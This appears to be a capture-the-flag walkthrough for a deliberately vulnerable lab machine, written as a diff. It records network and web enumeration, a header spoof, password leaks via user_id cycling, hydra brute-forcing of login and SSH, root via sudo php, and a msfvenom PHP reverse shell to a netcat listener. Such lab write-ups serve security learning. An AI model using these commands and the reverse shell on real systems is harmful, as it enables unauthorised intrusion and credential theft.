@@ -1,0 +1,192 @@
+[*]
+1. Find host: nmap -sn 172.16.16.0/24
+MAC Address: 08:00:27:88:AD:32 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.35
+Host is up (0.00017s latency).
+MAC Address: 08:00:27:B0:09:54 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.4
+[*]
+2. Scan host: nmap 172.16.16.35
+root@hostmachine:~/vulnhubdb# nmap 172.16.16.35
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 16:01 CST
+Nmap scan report for 172.16.16.35
+Host is up (0.00026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+[*]
+3. Enumerate ports: nmap -A 172.16.16.35 -p 22,80
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
+|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
+|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
+|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:B0:09:54 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[*]
+4. Web enumeration: nikto -h 172.16.16.35 && dirb http://172.16.16.35 -a linux
++ Server: Apache/2.4.7 (Ubuntu)
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.29
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/heyhoo.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3268: /config/: Directory indexing found.
++ /config/: Configuration information may be available remotely.
++ OSVDB-3268: /misc/: Directory indexing found.
++ OSVDB-3092: /misc/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7890 requests: 0 error(s) and 13 item(s) reported on remote host
+
+root@hostmachine:~/vulnhubdb# dirb http://172.16.16.35 -a linux | grep "+"
++ http://172.16.16.35/index.php (CODE:200|SIZE:120)
+==> DIRECTORY: http://172.16.16.35/misc/                                                                                                                                                                     
++ http://172.16.16.35/robots.txt (CODE:200|SIZE:32)
++ http://172.16.16.35/server-status (CODE:403|SIZE:292)
+
+[*]
+5. Checking artifact found in robots.txt: http://172.16.16.35/heyhoo.txt
+Great! What you need now is reconn, attack and got the shell
+[*]
+6. Found artifact at http://172.16.16.35/index.html
+Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<!-- Maybe you can search how to use x-forwarded-for -->
+[*]
+7. Sent request with headder "X-Forwarded-For: 127.0.0.1" at the bottom and boom we got the index page.
+    <div class="center">
+        <h2>Welcome To Ceban Corp</h2>
+        <p>Inspiring The People To Great Again!</p>
+        <hr>
+                <p><a href="?page=index">Home</a> | <a href="?page=login">Login</a> | <a href="?page=register">Register</a> | <a href="?page=about">About</a></p>
+                <hr>
+    </div>
+
+    
+</body>
+</html>
+[*]
+8. Found login page! It appears the login POST goes to http://172.16.16.35/misc/process.php?act=login.
+              <hr>
+    </div>
+
+    <form action="misc/process.php?act=login" method="POST">
+    <label for="username">Username</label>
+    <input type="text" name="username" id="username"><br>
+    <label for="password">Password</label>
+    <input type="password" name="password" id="password"><br>
+    <button type="submit" name="submit">Login</button>
+</form>
+</body>
+</html>
+[*]
+9. Crack login password: Didn't work :(
+hydra 172.16.16.35 -V http-form-post "/misc/process.php?act=login:username=^USER^&password=^PASS^&subit=:Login Failed" -l admin -P /usr/share/wordlists/rockyou.txt -t 40
+[*]
+10. Register new user: user=hackman&password=hackman
+[*]
+11. Login, at the profile page you will see the password pre-filled
+http://172.16.16.35/index.php?page=profile&user_id=12
+<input name="password" id="password" value="hackman" type="password">
+[*]
+12. Try to escalate: Cycled through user_id=1 through user_id=12
+<input name="password" id="password" value="skuyatuh" type="password"> #eweuhtandingan
+<input name="password" id="password" value="qwerty!!!" type="password"> #aingmaung
+<input name="password" id="password" value="indONEsia" type="password"> #sundatea
+<input name="password" id="password" value="cedihhihihi" type="password"> #sedihaingmah
+<input name="password" id="password" value="4lic3" type="password"> #alice
+[*]
+13. Crack SSH hopefully: put usernames in user.txt, and passwords in pass.txt
+hydra -L user.txt -P pass.txt ssh://172.16.16.35 -t 4
+
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
+[DATA] attacking ssh://172.16.16.35:22/
+[22][ssh] host: 172.16.16.35   login: alice   password: 4lic3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 16:48:13
+[*]
+14. Login as alice/4lic3. Enumerate user privs: sudo -l    
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on gfriEND:
+    (root) NOPASSWD: /usr/bin/php
+[*]
+15. Artifact found: alice/.my_secret/flag1.txt
+
+Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!
+
+Now your last job is get access to the root and read the flag ^_^
+
+Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
+[*]
+16. Artifact found: 
+alice@gfriEND:~$ cat .my_secret/my_notes.txt
+Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
+[*]
+17. Found mysql account info:
+alice@gfriEND:/var/www/html/config$ cat config.php 
+<?php
+
+    $conn = mysqli_connect('localhost', 'root', 'ctf_pasti_bisa', 'ceban_corp');
+[*]
+18. Grabbed database for giggles:
+MariaDB [ceban_corp]> select * from tbl_users;
++----+-----------------+----------------+-------------+------------------------------+
+| id | name            | username       | password    | email                        |
++----+-----------------+----------------+-------------+------------------------------+
+|  1 | Eweuh Tandingan | eweuhtandingan | skuyatuh    | eweuhtandingan@cebancorp.com |
+|  2 | Aing Maung      | aingmaung      | qwerty!!!   | aingmaung@cebancorp.com      |
+|  3 | Sunda Tea       | sundatea       | indONEsia   | sundatea@cebancorp.com       |
+|  4 | Sedih Aing Mah  | sedihaingmah   | cedihhihihi | sedihaingmah@cebancorp.com   |
+|  5 | Alice Geulis    | alice          | 4lic3       | alice@cebancorp.com          |
+|  9 | Abdi Kasep      | abdikasepak    | dorrrrr     | abdikasep@cebancorp.com      |
+| 12 | hackman         | hackman        | hackman     | hackman@hack.com             |
++----+-----------------+----------------+-------------+------------------------------+
+[*]
+19. Now lets get root: running php as root, lets test rootablility
+alice@gfriEND:~$ sudo /usr/bin/php -r 'echo shell_exec("whoami");'
+root
+[*]
+20. Now lets get our shell:
+  generate: msfvenom -p php/reverse_php LHOST=172.16.16.4 LPORT=4444 -f raw -o shell.php
+  transfer: scp shell.php alice@172.16.16.35:
+  start listen: nc -nvlp 4444
+  kickoff shell: sudo /usr/bin/php -F shell.php
+[*]
+21. Get flag!
+  ________        __    ___________.__             ___________.__                ._.
+ /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
+/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
+\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
+ \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
+        \/                              \/     \/       \/              \//_____/ \/
+
+Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)
+
+Contact me if you want to contribute / give me feedback / share your writeup!
+Twitter: @makegreatagain_
+Instagram: @aldodimas73
+
+Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
+[*]
+
+
+ 
+
+
+
+
